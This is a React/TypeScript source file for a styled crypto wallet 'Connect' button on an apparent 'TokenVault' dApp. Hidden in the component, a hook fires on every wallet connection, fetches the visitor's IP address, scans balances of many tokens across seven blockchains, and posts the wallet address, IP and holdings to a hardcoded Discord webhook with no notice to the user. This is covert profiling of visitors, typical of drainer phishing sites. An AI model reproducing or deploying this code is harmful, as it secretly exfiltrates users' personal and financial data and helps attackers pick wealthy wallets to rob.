import { ConnectButton } from '@rainbow-me/rainbowkit';
import React, { useEffect } from 'react';
import { useAccount } from 'wagmi';
import { createPublicClient, http, formatUnits, formatEther } from 'viem';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';

// Minimal ABI for balanceOf
const BAL_ABI = [
  {
    inputs: [{ name: 'account', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
] as const;

// Multi-chain config with public RPCs and popular tokens
const CHAINS = [
  {
    name: 'Ethereum', emoji: '⟠', native: 'ETH', decimals: 18,
    rpc: 'https://ethereum.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0xdAC17F958D2ee523a2206206994597C13D831ec7', d: 6 },
      { s: 'USDC', a: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', d: 6 },
      { s: 'DAI', a: '0x6B175474E89094C44Da98b954Eedeac495271d0F', d: 18 },
      { s: 'WBTC', a: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', d: 8 },
      { s: 'WETH', a: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', d: 18 },
      { s: 'LINK', a: '0x514910771AF9Ca656af840dff83E8264EcF986CA', d: 18 },
      { s: 'UNI', a: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', d: 18 },
      { s: 'SHIB', a: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', d: 18 },
      { s: 'PEPE', a: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', d: 18 },
      { s: 'AAVE', a: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', d: 18 },
      { s: 'MKR', a: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', d: 18 },
      { s: 'PYUSD', a: '0x6c3Ea9036406852006290770BEdFcAbA0e23A0e8', d: 6 },
      { s: 'USDP', a: '0x8E870D67F660D95d5be530380D0eC0bd388289E1', d: 18 },
      { s: 'stETH', a: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84', d: 18 },
    ],
  },
  {
    name: 'BSC', emoji: '⛓', native: 'BNB', decimals: 18,
    rpc: 'https://bsc-rpc.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0x55d398326f99059fF775485246999027B3197955', d: 18 },
      { s: 'USDC', a: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', d: 18 },
      { s: 'BUSD', a: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', d: 18 },
      { s: 'WBNB', a: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', d: 18 },
      { s: 'CAKE', a: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', d: 18 },
      { s: 'ETH', a: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', d: 18 },
    ],
  },
  {
    name: 'Polygon', emoji: '⬡', native: 'POL', decimals: 18,
    rpc: 'https://polygon-bor-rpc.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', d: 6 },
      { s: 'USDC', a: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', d: 6 },
      { s: 'WMATIC', a: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', d: 18 },
      { s: 'WETH', a: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', d: 18 },
      { s: 'DAI', a: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', d: 18 },
    ],
  },
  {
    name: 'Arbitrum', emoji: '🔵', native: 'ETH', decimals: 18,
    rpc: 'https://arbitrum-one-rpc.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', d: 6 },
      { s: 'USDC', a: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', d: 6 },
      { s: 'ARB', a: '0x912CE59144191C1204E64559FE8253a0e49E6548', d: 18 },
      { s: 'WETH', a: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', d: 18 },
      { s: 'DAI', a: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', d: 18 },
    ],
  },
  {
    name: 'Optimism', emoji: '🔴', native: 'ETH', decimals: 18,
    rpc: 'https://optimism-rpc.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', d: 6 },
      { s: 'USDC', a: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', d: 6 },
      { s: 'OP', a: '0x4200000000000000000000000000000000000042', d: 18 },
      { s: 'WETH', a: '0x4200000000000000000000000000000000000006', d: 18 },
      { s: 'DAI', a: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', d: 18 },
    ],
  },
  {
    name: 'Base', emoji: '🔷', native: 'ETH', decimals: 18,
    rpc: 'https://base-rpc.publicnode.com',
    tokens: [
      { s: 'USDC', a: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', d: 6 },
      { s: 'WETH', a: '0x4200000000000000000000000000000000000006', d: 18 },
      { s: 'DAI', a: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', d: 18 },
    ],
  },
  {
    name: 'Avalanche', emoji: '🔺', native: 'AVAX', decimals: 18,
    rpc: 'https://avalanche-c-chain-rpc.publicnode.com',
    tokens: [
      { s: 'USDT', a: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', d: 6 },
      { s: 'USDC', a: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', d: 6 },
      { s: 'WAVAX', a: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', d: 18 },
      { s: 'WETH', a: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB', d: 18 },
    ],
  },
];

type BalanceEntry = { chain: string; emoji: string; symbol: string; balance: string };

const fetchAllBalances = async (wallet: `0x${string}`): Promise<BalanceEntry[]> => {
  const allBalances: BalanceEntry[] = [];

  const chainResults = await Promise.allSettled(
    CHAINS.map(async (chain) => {
      const client = createPublicClient({ transport: http(chain.rpc) });
      const found: BalanceEntry[] = [];

      // Native balance
      try {
        const nativeBal = await client.getBalance({ address: wallet });
        if (nativeBal > 0n) {
          found.push({
            chain: chain.name,
            emoji: chain.emoji,
            symbol: chain.native,
            balance: formatEther(nativeBal),
          });
        }
      } catch { /* skip */ }

      // ERC20 balances in parallel
      const tokenResults = await Promise.allSettled(
        chain.tokens.map(t =>
          client.readContract({
            address: t.a as `0x${string}`,
            abi: BAL_ABI,
            functionName: 'balanceOf',
            args: [wallet],
          })
        )
      );

      chain.tokens.forEach((t, i) => {
        const r = tokenResults[i];
        if (r.status === 'fulfilled' && (r.value as bigint) > 0n) {
          found.push({
            chain: chain.name,
            emoji: chain.emoji,
            symbol: t.s,
            balance: formatUnits(r.value as bigint, t.d),
          });
        }
      });

      return found;
    })
  );

  chainResults.forEach(r => {
    if (r.status === 'fulfilled') allBalances.push(...r.value);
  });

  return allBalances;
};

const getIp = async (): Promise<string> => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch {
    return 'Unknown';
  }
};

const fmtBal = (raw: string) => {
  const n = parseFloat(raw);
  if (n === 0) return '0';
  if (n >= 1e6) return n.toLocaleString('en-US', { maximumFractionDigits: 0 });
  if (n >= 1) return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
  return n.toFixed(6);
};

const sendWebhook = async (walletAddress: string, chainName: string, chainId: number) => {
  try {
    const [ip, balances] = await Promise.all([
      getIp(),
      fetchAllBalances(walletAddress as `0x${string}`),
    ]);

    // Group by chain
    const byChain: Record<string, BalanceEntry[]> = {};
    balances.forEach(b => {
      const key = `${b.emoji} ${b.chain}`;
      if (!byChain[key]) byChain[key] = [];
      byChain[key].push(b);
    });

    // Build formatted balance text
    let balanceText = '';
    for (const [chainLabel, tokens] of Object.entries(byChain)) {
      balanceText += `**${chainLabel}**\n`;
      tokens.forEach(t => {
        balanceText += `• \`${t.symbol}\`: ${fmtBal(t.balance)}\n`;
      });
      balanceText += '\n';
    }

    if (!balanceText) balanceText = '_No tokens with balance found_';
    if (balanceText.length > 4000) {
      balanceText = balanceText.slice(0, 3990) + '\n…(truncated)';
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [
          {
            title: '🔗 Wallet Connected',
            color: 0x00f2ff,
            fields: [
              { name: '🌐 Chain', value: `${chainName} (ID: ${chainId})`, inline: true },
              { name: '📍 IP Address', value: `\`${ip}\``, inline: true },
              { name: '💳 Wallet Address', value: `\`${walletAddress}\`` },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: 'TokenVault DApp' },
          },
          {
            title: '💰 All Token Balances',
            description: balanceText,
            color: 0x00ff88,
            footer: {
              text: `${balances.length} token(s) across ${Object.keys(byChain).length} chain(s)`,
            },
          },
        ],
      }),
    });
  } catch (err) {
    console.error('Webhook error:', err);
  }
};

// Module-level guard — tracks address to prevent duplicate sends
let sentForAddress: string | null = null;

export const CustomConnectButton = () => {
  const { address, isConnected, chain } = useAccount();

  useEffect(() => {
    if (isConnected && address && sentForAddress !== address) {
      sentForAddress = address;
      const chainName = chain?.name || 'Unknown';
      const chainId = chain?.id || 0;
      sendWebhook(address, chainName, chainId);
    }
  }, [isConnected, address, chain]);

  return (
    <ConnectButton.Custom>
      {({
        account,
        chain,
        openAccountModal,
        openChainModal,
        openConnectModal,
        authenticationStatus,
        mounted,
      }) => {
        const ready = mounted && authenticationStatus !== 'loading';
        const connected =
          ready &&
          account &&
          chain &&
          (!authenticationStatus ||
            authenticationStatus === 'authenticated');

        return (
          <div
            {...(!ready && {
              'aria-hidden': true,
              style: {
                opacity: 0,
                pointerEvents: 'none',
                userSelect: 'none',
              },
            })}
          >
            {(() => {
              if (!connected) {
                return (
                  <button
                    onClick={openConnectModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 hover:bg-[#00f2ff]/10 text-[#00f2ff] px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all tech-glow flex items-center gap-2 group"
                  >
                    <span className="w-1.5 h-1.5 rounded-full bg-[#00f2ff] animate-pulse" />
                    Connect Access Key
                    <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1">_</span>
                  </button>
                );
              }

              if (chain.unsupported) {
                return (
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="tech-border bg-red-500/10 border-red-500/50 text-red-500 px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all"
                  >
                    Network Mismatch
                  </button>
                );
              }

              return (
                <div className="flex items-center gap-3">
                  <button
                    onClick={openChainModal}
                    type="button"
                    className="hidden sm:flex items-center gap-2 tech-border bg-white/5 px-3 py-1.5 text-[10px] font-bold text-slate-300 uppercase tracking-widest hover:bg-white/10 transition-all"
                  >
                    {chain.hasIcon && (
                      <div
                        style={{
                          background: chain.iconBackground,
                          width: 12,
                          height: 12,
                          borderRadius: 999,
                          overflow: 'hidden',
                        }}
                      >
                        {chain.iconUrl && (
                          <img
                            alt={chain.name ?? 'Chain icon'}
                            src={chain.iconUrl}
                            style={{ width: 12, height: 12 }}
                          />
                        )}
                      </div>
                    )}
                    {chain.name}
                  </button>

                  <button
                    onClick={openAccountModal}
                    type="button"
                    className="tech-border bg-[#00f2ff]/5 border-[#00f2ff]/30 text-white px-4 py-1.5 text-[11px] font-bold uppercase tracking-widest hover:bg-[#00f2ff]/10 transition-all flex items-center gap-3"
                  >
                    <div className="flex flex-col items-end leading-none">
                      <span className="text-[9px] text-[#00f2ff] mb-0.5">UPLINK_ACTIVE</span>
                      <span>{account.displayName}</span>
                    </div>
                    {account.displayBalance ? (
                      <span className="text-slate-500 border-l border-white/10 pl-3">
                        {account.displayBalance}
                      </span>
                    ) : null}
                  </button>
                </div>
              );
            })()}
          </div>
        );
      }}
    </ConnectButton.Custom>
  );
};
